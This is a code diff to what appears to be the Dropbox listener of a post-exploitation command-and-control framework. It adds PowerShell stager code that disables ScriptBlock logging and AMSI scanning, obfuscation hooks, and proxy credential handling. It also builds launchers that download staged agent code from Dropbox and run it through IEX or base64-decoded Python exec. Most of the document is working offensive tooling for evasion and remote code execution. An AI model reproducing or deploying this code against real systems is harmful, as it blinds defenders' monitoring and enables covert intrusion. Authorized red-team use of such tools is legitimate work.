@@ -14,6 +14,8 @@ from lib.common import agents
 from lib.common import encryption
 from lib.common import packets
 from lib.common import messages
+from lib.common import templating
+from lib.common import obfuscation
 
 
 class Listener:
@@ -111,6 +113,16 @@ class Listener:
                 'Description'   :   'Hours for the agent to operate (09:00-17:00).',
                 'Required'      :   False,
                 'Value'         :   ''
+            },
+            'SlackToken' : {
+                'Description'   :   'Your SlackBot API token to communicate with your Slack instance.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'SlackChannel' : {
+                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
+                'Required'      :   False,
+                'Value'         :   '#general'
             }
         }
 
@@ -146,7 +158,7 @@ class Listener:
         return True
 
 
-    def generate_launcher(self, encode=True, userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
         """
         Generate a basic launcher for the specified listener.
         """
@@ -173,14 +185,40 @@ class Listener:
             if language.startswith('po'):
                 # PowerShell
 
-                stager = ''
+                # replace with stager = '' for troubleshooting
+                stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
+                    stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
+
+                    # ScriptBlock Logging bypass
+                    stager += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
+                    stager += "'System.Management.Automation.Utils'"
+                    stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
+                    stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
+                    stager += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
+                    stager += "['ScriptB'+'lockLogging']"
+                    stager += helpers.randomize_capitalization("){$GPC")
+                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
+                    stager += helpers.randomize_capitalization("$GPC")
+                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
+                    stager += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
+                    stager += "('EnableScriptB'+'lockLogging',0);"
+                    stager += helpers.randomize_capitalization("$val.Add")
+                    stager += "('EnableScriptBlockInvocationLogging',0);"
+                    stager += helpers.randomize_capitalization("$GPC")
+                    stager += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
+                    stager += helpers.randomize_capitalization("=$val}")
+                    stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
+                    stager += "'signatures','N'+'onPublic,Static'"
+                    stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
+
                     # @mattifestation's AMSI bypass
-                    stager = helpers.randomize_capitalization("[Ref].Assembly.GetType(")
+                    stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
                     stager += "'System.Management.Automation.AmsiUtils'"
                     stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
                     stager += "'amsiInitFailed','NonPublic,Static'"
                     stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
+                    stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
                 stager += helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")
@@ -208,7 +246,15 @@ class Listener:
                             stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                         else:
                             # TODO: implement form for other proxy credentials
-                            pass
+                            username = proxyCreds.split(':')[0]
+                            password = proxyCreds.split(':')[1]
+                            domain = username.split('\\')[0]
+                            usr = username.split('\\')[1]
+                            stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
+                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
+
+                        #save the proxy settings to use during the entire staging process and the agent
+                        stager += "$Script:Proxy = $wc.Proxy;"
 
                 # TODO: reimplement stager retries?
 
@@ -233,8 +279,10 @@ class Listener:
                 # decode everything and kick it over to IEX to kick off execution
                 stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
 
+                if obfuscate:
+                    stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
-                if encode:
+                if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                     return helpers.powershell_launcher(stager, launcher)
                 else:
                     # otherwise return the case-randomized stager
@@ -273,10 +321,29 @@ class Listener:
                 launcherBase += "req.add_header(\"Dropbox-API-Arg\",'{\"path\":\"%s/debugpy\"}');\n" % (stagingFolder)
 
 
-                launcherBase += "if urllib2.getproxies():\n"
-                launcherBase += "   o = urllib2.build_opener();\n"
-                launcherBase += "   o.add_handler(urllib2.ProxyHandler(urllib2.getproxies()))\n"
-                launcherBase += "   urllib2.install_opener(o);\n"
+                if proxy.lower() != "none":
+                    if proxy.lower() == "default":
+                        launcherBase += "proxy = urllib2.ProxyHandler();\n"
+                    else:
+                        proto = proxy.Split(':')[0]
+                        launcherBase += "proxy = urllib2.ProxyHandler({'"+proto+"':'"+proxy+"'});\n"
+
+                    if proxyCreds != "none":
+                        if proxyCreds == "default":
+                            launcherBase += "o = urllib2.build_opener(proxy);\n"
+                        else:
+                            launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler();\n"
+                            username = proxyCreds.split(':')[0]
+                            password = proxyCreds.split(':')[1]
+                            launcherBase += "proxy_auth_handler.add_password(None,'"+proxy+"','"+username+"','"+password+"');\n"
+                            launcherBase += "o = urllib2.build_opener(proxy, proxy_auth_handler);\n"
+                    else:
+                        launcherBase += "o = urllib2.build_opener(proxy);\n"
+                else:
+                    launcherBase += "o = urllib2.build_opener();\n"
+
+                #install proxy and creds globally, so they can be used with urlopen.
+                launcherBase += "urllib2.install_opener(o);\n"
 
                 launcherBase += "a=urllib2.urlopen(req).read();\n"
                 launcherBase += "IV=a[0:4];"
@@ -298,7 +365,7 @@ class Listener:
 
                 if encode:
                     launchEncoded = base64.b64encode(launcherBase)
-                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % (launchEncoded)
+                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | /usr/bin/python &" % (launchEncoded)
                     return launcher
                 else:
                     return launcherBase
@@ -321,6 +388,7 @@ class Listener:
         baseFolder = listenerOptions['BaseFolder']['Value'].strip('/')
         apiToken = listenerOptions['APIToken']['Value']
         profile = listenerOptions['DefaultProfile']['Value']
+        workingHours = listenerOptions['WorkingHours']['Value']
         stagingFolder = "/%s/%s" % (baseFolder, listenerOptions['StagingFolder']['Value'].strip('/'))
 
         if language.lower() == 'powershell':
@@ -334,6 +402,10 @@ class Listener:
             stager = stager.replace('REPLACE_STAGING_FOLDER', stagingFolder)
             stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
             stager = stager.replace('REPLACE_POLLING_INTERVAL', pollInterval)
+
+            #patch in working hours, if any
+            if workingHours != "":
+                stager = stager.replace('WORKING_HOURS_REPLACE', workingHours)
 
             randomizedStager = ''
 
@@ -359,18 +431,22 @@ class Listener:
 
 
         elif language.lower() == 'python':
+            template_path = [
+                os.path.join(self.mainMenu.installPath, '/data/agent/stagers'),
+                os.path.join(self.mainMenu.installPath, './data/agent/stagers')]
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template('dropbox.py')
 
-            f = open("%s/data/agent/stagers/dropbox.py" % (self.mainMenu.installPath))
-            stager = f.read()
-            f.close()
+            template_options = {
+                    'staging_folder': stagingFolder,
+                    'poll_interval': pollInterval,
+                    'staging_key': stagingKey,
+                    'profile': profile,
+                    'api_token': apiToken
+                    }
 
-            stager = helpers.strip_python_comments(stager)
-            # patch the server and key information
-            stager = stager.replace('REPLACE_STAGING_FOLDER', stagingFolder)
-            stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
-            stager = stager.replace('REPLACE_POLLING_INTERVAL', pollInterval)
-            stager = stager.replace('REPLACE_PROFILE', profile)
-            stager = stager.replace('REPLACE_API_TOKEN', apiToken)
+            stager = template.render(template_options)
+            stager = obfuscation.py_minify(stager)
 
             if encode:
                 return base64.b64encode(stager)
@@ -400,12 +476,12 @@ class Listener:
         jitter = listenerOptions['DefaultJitter']['Value']
         profile = listenerOptions['DefaultProfile']['Value']
         lostLimit = listenerOptions['DefaultLostLimit']['Value']
-        killDate = listenerOptions['KillDate']['Value']
         workingHours = listenerOptions['WorkingHours']['Value']
+        killDate = listenerOptions['KillDate']['Value']
         b64DefaultResponse = base64.b64encode(self.default_response())
 
         if language == 'powershell':
-            f = open(self.mainMenu.installPath + "./data/agent/agent.ps1")
+            f = open(self.mainMenu.installPath + "/data/agent/agent.ps1")
             code = f.read()
             f.close()
 
@@ -426,12 +502,10 @@ class Listener:
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
                 code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
-            if workingHours != "":
-                code = code.replace('$WorkingHours,', "$WorkingHours = '" + str(workingHours) + "',")
 
             return code
         elif language == 'python':
-            f = open(self.mainMenu.installPath + "./data/agent/agent.py")
+            f = open(self.mainMenu.installPath + "/data/agent/agent.py")
             code = f.read()
             f.close()
 
@@ -442,7 +516,7 @@ class Listener:
             #strip out comments and blank lines
             code = helpers.strip_python_comments(code)
 
-            #patch some more 
+            #patch some more
             code = code.replace('delay = 60', 'delay = %s' % (delay))
             code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
             code = code.replace('profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
@@ -490,6 +564,10 @@ class Listener:
             # set the proxy settings for the WC to be the default system settings
             $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
             $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+            if($Script:Proxy) {
+                $wc.Proxy = $Script:Proxy;
+            }
+
             $wc.Headers.Add("User-Agent", $script:UserAgent)
             $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
 
@@ -532,6 +610,10 @@ class Listener:
             # set the proxy settings for the WC to be the default system settings
             $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
             $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+            if($Script:Proxy) {
+                $wc.Proxy = $Script:Proxy;
+            }
+
             $wc.Headers.Add('User-Agent', $Script:UserAgent)
             $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
 
@@ -553,6 +635,12 @@ class Listener:
                 }
 
                 $wc2 = New-Object System.Net.WebClient
+                $wc2.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                $wc2.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                if($Script:Proxy) {
+                    $wc2.Proxy = $Script:Proxy;
+                }
+
                 $wc2.Headers.Add("Authorization", "Bearer $($Script:APIToken)")
                 $wc2.Headers.Add("Content-Type", "application/octet-stream")
                 $wc2.Headers.Add("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
@@ -605,16 +693,16 @@ def send_message(packets=None):
     except:
         pass
 
-    
+
     if packets:
         data = ''.join(packets)
         # aes_encrypt_then_hmac is in stager.py
         encData = aes_encrypt_then_hmac(key, data)
         data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
         #check to see if there are any results already present
-        
+
         headers['Dropbox-API-Arg'] = "{\\"path\\":\\"%s/%s.txt\\"}" % (resultsFolder, sessionID)
-        
+
         try:
             pkdata = post_message('https://content.dropboxapi.com/2/files/download', data=None, headers=headers)
         except:
@@ -897,7 +985,7 @@ def send_message(packets=None):
                     dbx.files_delete(fileName)
                 except dropbox.exceptions.ApiError:
                     dispatcher.send("[!] Error deleting data at '%s'" % (fileName), sender="listeners/dropbox")
-                
+
                 self.mainMenu.agents.handle_agent_data(stagingKey, responseData, listenerOptions)
 
 
